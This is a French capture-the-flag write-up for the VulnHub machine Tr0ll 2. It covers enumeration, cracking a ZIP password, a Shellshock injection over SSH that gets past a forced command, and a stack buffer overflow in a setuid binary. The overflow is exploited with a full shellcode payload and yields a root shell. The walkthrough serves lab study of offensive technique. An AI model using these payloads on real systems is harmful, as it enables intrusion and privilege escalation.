# Solution du CTF Tr0ll #2 de VulnHub

Le CTF [Tr0ll: 2](https://vulnhub.com/entry/tr0ll-2,107/) était relativement facile pour peu que l'on se rappelle de cette fameuse vulnérabilité qui a défrayé la chronique à une époque...

```
Nmap scan report for 192.168.56.88
Host is up (0.00039s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 82fe93b8fb38a677b5a625786b35e2a8 (DSA)
|   2048 7da599b8fb6765c96486aa2cd6ca085d (RSA)
|_  256 91b86a45be41fdc814b502a0667c8c96 (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.22 (Ubuntu)
```

## Filtrage de trolls

Le site web ne retourne rien d'intressant mais on trouve un fichier `robots.txt` qui contient 21 d'entrées. Je les copie-colle dans un fichier que je passe à `feroxbuster` pour faire le tri :

```
301        9l       28w      322c http://192.168.56.88/ok_this_is_it
301        9l       28w      320c http://192.168.56.88/dont_bother
301        9l       28w      313c http://192.168.56.88/noob
301        9l       28w      320c http://192.168.56.88/keep_trying
```

Dans chacun de ces fichiers ont trouve une page d'index qui semble pointer vers une copie d'une même image mais en téléchargeant les différents fichiers on remarque que l'une est différente :

```
8e40e4bf4212b317788de52381072cd8  cat_the_troll1.jpg
f094e16de91dae231812a2fb382d8803  cat_the_troll2.jpg
8e40e4bf4212b317788de52381072cd8  cat_the_troll3.jpg
8e40e4bf4212b317788de52381072cd8  cat_the_troll4.jpg
```

A la fin du fichier on trouve le message suivant :

> Look Deep within y0ur_self for the answer

Et quand on demande le dossier `/y0ur_self` au serveur web on y trouve un fichier `answer.txt` qui pèse *juste* 1.3Mo. Chaque ligne est encodée en base64 mais la commande `base64 -d` n'en fait qu'une bouchée.

On se retrouve alors à une wordlist qui semble correspondre à des mots anglais. Impossible de dire quoi en faire à ce stade.

On va donc fouiller un peu sur le serveur FTP mais ce n'est pas vraiment parlant....

```shellsession
$ ncat 192.168.56.88 21 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Connected to 192.168.56.88:21.
220 Welcome to Tr0ll FTP... Only noobs stay for a while...
```

Finalement on parvient à se connecter avec  les identifiants `Tr0ll` / `Tr0ll`. On y trouve une archize ZIP `lmao.zip` protégée par mot de passe.

Avec `zip2john` puis `JohnTheRipper` et la wordlist décodée on trouve le mot de passe `ItCantReallyBeThisEasyRightLOL`.

Une fois décompressée on obtient une clé privée SSH dans l'archive zip.

Avec le nom d'utilisateur `noob` l'authentification semble passer mais on est aussitôt éjecté :

```shellsession
$ ssh -o PubkeyAcceptedKeyTypes=ssh-rsa -i noob noob@192.168.56.88
TRY HARDER LOL!
Connection to 192.168.56.88 closed.
```

Spécifier une commande spécifique au serveur SSH ne donne pas plus de résultats. Ajouté à celà ni `scp` ni `sftp` ne sont disponibles.

J'ai regardé si d'autres ports étaient en écoute sur la machine en mettant en place un serveur SOCKS à travers le tunnel SSH :

```shellsession
$ ssh -D 1080 -N -o PubkeyAcceptedKeyTypes=ssh-rsa -i noob noob@192.168.56.88
```

Une fois `proxychains` configuré pour le proxy je peux scanner les ports internes avec `Nmap` :

```shellsession
$ ./proxychains4 -q nmap -sT -p- 127.0.0.1 
tarting Nmap 7.93 ( https://nmap.org ) at 2023-01-01 16:35 CET
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00047s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
```

Pas mieux donc...

## Coquille Saint Jacques

Finalement en cherchant `shellshock` et `ssh` sur le web j'ai trouvé cette réponse qui semble parfaitement matcher notre situation :

[bash - how can shellshock be exploited over SSH? - Unix &amp; Linux Stack Exchange](https://unix.stackexchange.com/a/157502)

Effectivement le serveur est bien vulnérable :

```shellsession
$ ssh -o PubkeyAcceptedKeyTypes=ssh-rsa -i noob noob@192.168.56.88 '() { :;}; echo MALICIOUS CODE'
MALICIOUS CODE
TRY HARDER LOL!
```

Et la config du CTF est bien celle décrite :

```shellsession
$ ssh -o PubkeyAcceptedKeyTypes=ssh-rsa -i noob noob@192.168.56.88 '() { :;}; cat .ssh/authorized_keys'
command="echo TRY HARDER LOL!" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwi2G/kLMyjm/rrcQymKVqy4EgUyJ+3Oyv7D5QV73IWECguqrINI+OuY+zIV49ykebBYR15HkBYi/9GYZmHRD5CHq9I+zCLHv/9Kdf9Ae+HQIaF/X/3PC0lIx6XLmgIY66MwuMNmOvK7U8rERPUJxSmLKWvaSAP9/LXVOHfcrCZyyCc+ir6kxsKHzojM0EResF2RgKfbbZ2MFqr6YSO9+ohdZBgGVncc1ngtW0b7mKf1u+RTnP7XeWxOkD2nHpghvKs8wwXNw6vE12lNjzqjPDTb4yYVph8zHKPYZst6PT6qeLArJ7lKwX540FEp2q9Ji2xUTXVLBCYXiKZ0k7Ru69 noob@Tr0ll2
```

De la même façon je peux rajouter une entrée au fichier `authorized_keys` qui n'a pas le préfixe `command=` et me connecter normalement. 

## Gonna pwnnnnnnnnnnnnnnnnnnnnnnnnnnn

A la racine du système on trouve un dossier `nothing_to_see_here` qui contient trois binaires setuid ayant le même nom :

```
/nothing_to_see_here/choose_wisely/door1:
total 8
-rwsr-xr-x 1 root root 7271 Oct  4  2014 r00t

/nothing_to_see_here/choose_wisely/door2:
total 8
-rwsr-xr-x 1 root root 7273 Oct  5  2014 r00t

/nothing_to_see_here/choose_wisely/door3:
total 12
-rwsr-xr-x 1 root root 8401 Oct  5  2014 r00t
```

Tous sont des programmes de petite taille. `Cutter` décompile le premier sous cette forme :

```c
#include <stdint.h>
 
int32_t dbg_main (void) {
    int32_t argc;
    char ** argv;
    const char * src;
    char [256] buf;
    /* int main(int argc,char ** argv); */
    if (argc == 1) {
        eax = argv;
        edx = *(eax);
        eax = "Usage: %s input\n";
        src = edx;
        printf (eax);
        exit (0);
    }
    eax = argv;
    eax += 4;
    eax = *(eax);
    eax = &buf;
    strcpy (eax, *(eax));
    eax = 0x8048591;
    edx = &buf;
    src = edx;
    printf (eax);
    return eax;
}

```

Il est vulnérable à un buffer overflow :

```shellsession
noob@Tr0ll2:~$ /nothing_to_see_here/choose_wisely/door1/r00t `python -c 'print "A"*300'`
Segmentation fault
noob@Tr0ll2:~$ dmesg | tail -1
[ 9516.169849] r00t[6242]: segfault at 41414141 ip 41414141 sp bffffb50 error 14
```

Le second se décompile comme ceci :

```c
#include <stdint.h>

int32_t main (void) {
    puts ("Good job, stand by, executing root shell...");
    sleep (3);
    puts ("BUHAHAHA NOOB!");
    sleep (1);
    eax = fork ();
    if (eax == 0) {
        system ("/sbin/reboot");
    }
    return eax;
}
```

Et finalement le troisième :

```c
#include <stdint.h>

int32_t main (void) {
    puts ("\n2 MINUTE HARD MODE LOL");
    eax = fork ();
    if (eax == 0) {
        system ("/bin/chmod 600 /bin/ls");
        sleep (0x78);
        system ("/bin/chmod 777 /bin/ls");
    }
    return eax;
}
```

Ce dernier est vulnérable car il rend `/bin/ls` word-writable or le programme est notamment appelé dans une table cron qui se lance tous les jours (`cron.daily/apt`). Voici un extrait du code :

```bash
    # check size
    if [ ! $MaxSize -eq 0 ]; then
        # maxSize is in MB
        MaxSize=$(($MaxSize*1024))

        #get current time
        now=$(date --date=$(date --iso-8601) +%s)
        MinAge=$(($MinAge*24*60*60))

        # reverse-sort by mtime
        for file in $(ls -rt $Cache/*.deb 2>/dev/null); do
            du=$(du -s $Cache)
            size=${du%%/*}
```

Vu qu'il s'agit de la tache qui gère le cache APT il est possible que certaines conditions doivent être réunies pour entrer dans cette section du code.

On pourrait s'attendre que les binaires qui appellent `system()` soit vulnérables à *Shellshock* mais ça ne semble pourtant pas être le cas.

L'exploitation du buffer overflow est en tout point similaire à celui du [CTF Underdist #3](https://github.com/devl00p/blog/blob/main/ctf_writeups/Solution%20du%20CTF%20Underdist%20%233%20de%20VulnHub.md) avec les même conditions donc je n'entrerais pas dans les détails : il y a juste le nombre d'octets avant l'adresse de retour et l'adresse de retour à changer.

Rendez-vous sur l'autre writeup pour les détails de l'exploitation.

```shellsession
noob@Tr0ll2:~$ /nothing_to_see_here/choose_wisely/door1/r00t `python -c 'print "A"*268 + "\x55\xea\xe2\xb7" + "\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80"'`
# id
uid=0(root) gid=1002(noob) groups=0(root),1002(noob)
# cd /root
# ls
Proof.txt  core1  core2  core3  core4  goal  hardmode  lmao.zip  ran_dir.py  reboot
# cat Proof.txt
You win this time young Jedi...

a70354f0258dcc00292c72aab3c8b1e4
```

## Sous le capot

Le CTF a un script qui change au démarrage quel binaire setuid root fait telle ou telle tache :

```python
#!/usr/bin/env python
import random
import shutil
import os

source1 = "/root/core1/"
source2 = "/root/core2/"
source3 = "/root/core3/"
source4 = "/root/core4/"

dest= "/nothing_to_see_here/choose_wisely/"

lottery = random.randrange(1,5)

def choice():
        if lottery == 1:
                os.system("rm -r /nothing_to_see_here/*")
                shutil.copytree(source1, dest, symlinks = False, ignore = None)
        elif lottery == 2:
                os.system("rm -r /nothing_to_see_here/*")
                shutil.copytree(source2, dest, symlinks = False, ignore = None)
        elif lottery == 3:
                os.system("rm -r /nothing_to_see_here/*")
                shutil.copytree(source3, dest, symlinks = False, ignore = None)
        elif lottery == 4:
                os.system("rm -r /nothing_to_see_here/*")
                shutil.copytree(source4, dest, symlinks = False, ignore = None)
choice()
os.system("chmod -R u+s /nothing_to_see_here")
```

*Publié le 1er janvier 2023*
